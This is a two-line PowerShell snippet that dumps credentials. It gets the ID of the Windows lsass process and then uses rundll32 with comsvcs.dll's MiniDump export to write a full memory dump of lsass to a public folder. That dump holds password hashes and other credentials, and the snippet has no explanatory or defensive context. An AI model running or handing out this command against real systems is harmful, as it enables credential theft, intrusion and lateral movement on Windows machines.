$prosess_id = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $prosess_id C:\Users\Public\lsass.dmp full